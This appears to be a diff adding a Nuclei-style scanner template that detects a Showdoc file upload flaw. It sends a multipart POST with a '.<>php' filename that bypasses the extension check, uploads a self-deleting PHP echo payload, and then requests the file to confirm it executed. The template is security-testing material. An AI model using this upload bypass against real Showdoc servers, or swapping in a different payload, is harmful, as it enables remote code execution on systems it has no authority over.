@@ -1,0 +1,58 @@
+id: showdoc-uploadfile
+
+info:
+  name: Showdoc Uploadfile Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+  description: |
+    Detects a file upload vulnerability in Showdoc application that allows uploading and executing arbitrary PHP files.
+
+variables:
+  r1: "{{rand_base(4)}}"
+  r2: "{{rand_base(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=/home/page/uploadImg"
+    headers:
+      Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+    body: |
+      ----------------------------835846770881083140190633
+      Content-Disposition: form-data; name="editormd-image-file"; filename="{{r1}}.<>php"
+      Content-Type: text/plain
+
+      <?php echo "{{r2}}"; unlink(__FILE__); ?>
+      ----------------------------835846770881083140190633--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "success"
+    extractors:
+      - type: regex
+        name: upload-path
+        internal: true
+        regex:
+          - "(?P<date>\\d{4}-\\d{2}-\\d{2})\\/(?P<file>[a-f0-9]+\\.php)"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Public/Uploads/{{date}}/{{file}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "{{r2}}"
